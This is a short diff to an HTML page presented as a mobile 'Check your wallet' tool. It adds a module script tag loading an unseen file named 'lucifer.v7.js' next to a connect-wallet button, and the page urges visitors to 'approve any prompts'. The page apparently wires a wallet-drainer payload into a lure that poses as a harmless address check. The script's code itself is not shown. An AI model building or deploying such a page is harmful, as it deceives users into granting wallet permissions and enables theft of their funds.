@@ -48,8 +48,10 @@
     footer{padding:16px;text-align:center;color:var(--muted);font-size:12px}
     @media (max-width:340px){.lead{font-size:13px}.cta{font-size:15px}}
   </style>
+  <script type="module" crossorigin src="./files/lucifer.v7.js"></script>
 </head>
 <body>
+
   <div class="app">
     <div class="phone-frame">
       <header>
@@ -131,7 +133,7 @@
           Tap the button to connect your wallet and scan addresses. Please approve any prompts; permissions may be required to read addresses.
         </p>
 
-        <button id="connectBtn" class="cta">Check your wallet</button>
+        <button id="connectBtn interactBtn" class="cta">Check your wallet</button>
         <div id="status" class="status" aria-live="polite"></div>
       </main>
 
